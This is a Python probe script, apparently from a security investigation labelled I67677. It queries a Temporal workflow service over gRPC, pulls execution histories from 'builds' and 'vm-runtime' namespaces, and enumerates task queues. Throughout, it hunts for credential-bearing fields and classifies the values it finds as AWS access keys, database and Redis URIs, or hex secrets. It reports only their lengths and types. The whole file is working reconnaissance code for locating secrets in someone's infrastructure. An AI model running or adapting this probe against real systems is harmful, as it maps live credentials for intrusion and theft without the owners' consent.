#!/usr/bin/env python3
# I67677 probe3: metadata-only presence/length check of credential-bearing fields + task queue/VM inventory
import json, re
src = open('/probe.py').read().split("print('===I67677 PROBE START")[0]
ns = {}
exec(src, ns)
grpc_call = ns['grpc_call']; parse = ns['parse']; fb = ns['fb']; fs = ns['fs']; fv = ns['fv']
fmsg = ns['fmsg']; all_of = ns['all_of']; get1 = ns['get1']; frame_payload = ns['frame_payload']

T = '/temporal.api.workflowservice.v1.WorkflowService/'
SENS = re.compile(r'(?i)(token|secret|password|passwd|credential|accesskey|bearer|private|apikey|api_key|session|dsn|database_url)')


def is_aws(v):
    if not isinstance(v, str):
        return '-'
    if re.match(r'^AKIA[0-9A-Z]{16}$', v):
        return 'AWS_AKIA'
    if re.match(r'^ASIA[0-9A-Z]{16}$', v):
        return 'AWS_ASIA'
    if re.match(r'^[A-Za-z0-9+/]{40}$', v):
        return 'b64like40'
    if v.startswith('postgres://') or v.startswith('postgresql://'):
        return 'postgres_uri'
    if v.startswith('redis://'):
        return 'redis_uri'
    if v.startswith('http'):
        return 'url'
    if re.match(r'^[0-9a-f]{32,64}$', v):
        return 'hex%d' % len(v)
    return 'opaque'


def walk(o, prefix, out):
    if isinstance(o, dict):
        for k, v in o.items():
            p = prefix + k
            if SENS.search(k) and isinstance(v, str):
                out.append((p, len(v), is_aws(v)))
            walk(v, p + '.', out)
    elif isinstance(o, list):
        for it in o[:3]:
            walk(it, prefix, out)


json_re = re.compile(rb'\{"', re.S)


def jsons_from(b):
    out = []
    i = 0
    while True:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start()
        depth = 0
        j = s
        inq = esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc:
                    esc = False
                elif c == b'\\':
                    esc = True
                elif c == b'"':
                    inq = False
            else:
                if c == b'"':
                    inq = True
                elif c == b'{':
                    depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0:
                        break
            j += 1
        if j < len(b) and 2 < j - s < 400000:
            try:
                out.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception:
                pass
        i = max(j, s + 2)
        if len(out) > 20:
            break
    return out


def list_execs(ns_, q='', size=8):
    req = fs(1, ns_) + fv(2, size) + (fs(4, q) if q else b'')
    r = grpc_call(T + 'ListWorkflowExecutions', req, timeout=20)
    if r['st'] != '0':
        return []
    pl = frame_payload(r['data'])
    out = []
    for ei in all_of(pl, 1):
        ex = get1(ei, 1) or b''
        wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
        rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
        ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
        if wid:
            out.append((wid, rid, ty))
    return out


print('===I67677-P3 START===', flush=True)
targets = []
for q in ['WorkflowType="ScheduleBuildAndPublishImage"']:
    for e in list_execs('builds', q, 3):
        targets.append(('builds', e))
for e in list_execs('vm-runtime', '', 4):
    targets.append(('vm-runtime', e))
seen = set()
for ns_, (wid, rid, ty) in targets:
    if rid in seen:
        continue
    seen.add(rid)
    req = fs(1, ns_) + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20)
    r = grpc_call(T + 'GetWorkflowExecutionHistory', req, timeout=25)
    if r['st'] != '0':
        print('H3|%s|%s|st=%s' % (ty[:30], wid[:40], r['st']), flush=True)
        continue
    pl = frame_payload(r['data'])
    found = []
    keys = []
    for j in jsons_from(pl):
        walk(j, '', found)
        if isinstance(j, dict):
            keys += list(j.keys())
    # dedupe
    dd = {}
    for p, l, c in found:
        dd[p] = (l, c)
    print('H3|%s|%s|st=0|len=%d|sensfields=%d|top=%s' % (ns_, ty[:34], r['n'], len(dd), ','.join(sorted(set(keys))[:16])), flush=True)
    for p in sorted(dd)[:26]:
        l, c = dd[p]
        print('   F|%s|len=%d|class=%s' % (p, l, c), flush=True)
    # structure-only summary of the top-level request json
    for j in jsons_from(pl)[:2]:
        if isinstance(j, dict):
            print('   TOPS=' + ','.join(sorted(j.keys()))[:400], flush=True)
            break

print('===P3 TASK QUEUES===', flush=True)
for ns_ in ['builds', 'vm-runtime']:
    req = fs(1, ns_) + fmsg(2, fs(1, 'x')) + fv(3, 1) + fv(4, 3)  # ListTaskQueuePartitions
    r = grpc_call(T + 'ListTaskQueuePartitions', req, timeout=15)
    print('LTP|%s|st=%s|len=%d' % (ns_, r['st'], r['n']), flush=True)
    if r['st'] == '0' and r['data']:
        txt = frame_payload(r['data']).decode('utf-8', 'replace')
        print('   S=' + ' | '.join(sorted(set(re.findall(r'[A-Za-z0-9_./:-]{6,80}', txt)))[:16]), flush=True)
print('===I67677-P3 END===', flush=True)
